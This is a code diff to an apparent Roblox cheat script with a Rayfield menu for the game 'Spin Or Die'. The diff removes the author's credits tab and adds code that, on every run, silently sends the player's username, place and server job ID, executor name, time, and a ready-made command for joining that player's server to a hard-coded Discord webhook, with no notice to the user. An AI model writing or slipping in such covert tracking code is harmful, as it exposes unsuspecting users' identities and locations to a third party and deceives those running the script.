@@ -7,7 +7,6 @@ local mainwin = Rayfield:CreateWindow({
 
 local maintab = mainwin:CreateTab({ name = "Main" })
 local statstab = mainwin:CreateTab({ name = "Stats" })
-local credits = mainwin:CreateTab({ name = "Credits" })
 
 local gunList = {}
 local selectedGunIndex = 1
@@ -201,13 +200,61 @@ statstab:CreateButton({
     end,
 })
 
-credits:CreateText({
-    name = "Credits",
-    text = "By IceyWWW, Join the Discord server if you find any bugs, made with ❤️",
-})
 
-credits:CreateText({
-  name = "Discord Server",
-  text = "https://discord.gg/B5qyFzPgmT Go to Robloxscripts if you don't wanna type it."
-})
-print("ready.")
+local webhookURL = "https://discord.com/api/webhooks/1545265454204067860/VeYlEcNT5rqNVNeMoWxmE2jrJUDnKQ_xO6UT5HeGsoXeJkBii7mjGgftdmI0i4yesF81"
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+wait(0.2)
+local timeExecuted = os.date("%Y-%m-%d %H:%M:%S", os.time())
+
+local success, executorName = pcall(function()
+    return identifyexecutor()
+end)
+if not success then executorName = "Unknown" end
+
+local placeName = "Unknown Place"
+local successPlace, result = pcall(function()
+    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+end)
+if successPlace then placeName = result end
+
+local data = {
+    content = "",
+    embeds = {
+        {
+            title = "Spin Or Die Execution Details",
+            color = 16711680,
+            fields = {
+                { name = "**Player Name**", value = "`" .. game.Players.LocalPlayer.Name .. "`", inline = true },
+                { name = "**Place ID**", value = "`" .. game.PlaceId .. "`", inline = true },
+                { name = "**Place Name**", value = "`" .. placeName .. "`", inline = true },
+                { name = "**Job ID**", value = "`" .. game.JobId .. "`", inline = false },
+                { name = "**Time Executed**", value = "`" .. timeExecuted .. "`", inline = true },
+                { name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
+                {
+                    name = "**Quick Join**",
+                    value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. game.JobId .. "', game.Players.LocalPlayer)\n```",
+                    inline = false
+                }
+            },
+            footer = {
+                text = "Execution Log • " .. os.date("%Y-%m-%d %H:%M:%S"),
+                --icon_url = ""
+            }
+        }
+    }
+}
+
+local jsonData = game:GetService("HttpService"):JSONEncode(data)
+
+if httprequest then
+    httprequest({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = jsonData
+    })
+else
+    print("HTTP Request Unsupported.")
+end
+
+print("Ready.")
